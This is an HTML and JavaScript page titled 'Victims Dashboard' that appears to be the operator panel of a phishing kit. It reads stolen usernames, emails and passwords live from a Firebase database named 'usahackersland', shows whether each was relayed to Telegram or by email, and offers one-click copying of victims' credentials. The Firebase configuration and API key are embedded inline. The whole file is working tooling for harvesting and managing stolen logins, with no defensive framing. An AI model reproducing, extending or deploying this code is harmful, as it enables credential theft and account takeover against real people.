<!DOCTYPE html>
<html>
<head>
    <title>📋 Victims Dashboard</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
    <style>
        body { font-family: Arial, sans-serif; background: #f2f2f2; padding: 20px; }
        h2 { text-align: center; }
        .card { background: white; padding: 15px; margin: 15px auto; border-radius: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.1); max-width: 600px; position: relative; }
        .flag-emoji { font-size: 24px; vertical-align: middle; }
        .status { font-weight: bold; }
        .status.ok { color: green; }
        .status.fail { color: red; }
        button.copy-btn, button.delete-btn {
            position: absolute;
            top: 15px;
            padding: 5px 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            color: white;
            font-weight: bold;
            font-size: 12px;
        }
        button.copy-btn {
            right: 60px;
            background-color: #4CAF50;
        }
        button.delete-btn {
            right: 15px;
            background-color: #f44336;
        }
    </style>
</head>
<body>
    <h2>📋 Victims Dashboard</h2>
    <div id="victimsList"></div>

    <script>
    const firebaseConfig = {
        apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
        authDomain: "usahackersland.firebaseapp.com",
        projectId: "usahackersland",
        storageBucket: "usahackersland.appspot.com",
        messagingSenderId: "588407428267",
        appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    function copyText(text) {
        navigator.clipboard.writeText(text)
            .then(() => alert('Copied to clipboard!'))
            .catch(() => alert('Failed to copy.'));
    }

    function renderVictims(data) {
        let output = "";

        data.forEach(doc => {
            const v = doc.data();
            output += `
                <div class="card" data-id="${doc.id}">
                    <button class="copy-btn" title="Copy Credentials">📋 Copy</button>
                    <button class="delete-btn" title="Delete Entry">🗑️ Delete</button>

                    📧 <b>Username/Email:</b> ${v.Username || v.Email || ''} <br>
                    🔑 <b>Password:</b> ${v.Password || ''} <br>
                    🕒 <b>Time:</b> ${v.timestamp || ''} <br>
                    🔄 <b>Redirect:</b> ${v.redirectLinkSentTo || ''} <br>
                    📲 <b>Telegram:</b> <span class="status ${v.telegramSent ? 'ok' : 'fail'}">${v.telegramSent ? '✅ Sent' : '❌ Fail'}</span><br>
                    📧 <b>Email:</b> <span class="status ${v.emailSent ? 'ok' : 'fail'}">${v.emailSent ? '✅ Sent' : '❌ Fail'}</span><br>
                </div>
            `;
        });

        document.getElementById('victimsList').innerHTML = output;

        document.querySelectorAll('.card').forEach(card => {
            const id = card.getAttribute('data-id');

            card.querySelector('.copy-btn').onclick = () => {
                const victim = data.find(d => d.id === id).data();
                const textToCopy = `Email: ${victim.Username || victim.Email || ''}\nPassword: ${victim.Password || ''}`;
                copyText(textToCopy);
            };

            card.querySelector('.delete-btn').onclick = () => {
                if (confirm('Delete this entry?')) {
                    db.collection("forms").doc("defaultForm123").collection("victims").doc(id).delete()
                        .then(() => alert('Entry deleted'))
                        .catch(err => alert('Delete failed: ' + err.message));
                }
            };
        });
    }

    db.collection("forms").doc("defaultForm123").collection("victims").orderBy("timestamp", "desc").onSnapshot(snapshot => {
        renderVictims(snapshot.docs);
    });
    </script>
</body>
</html>
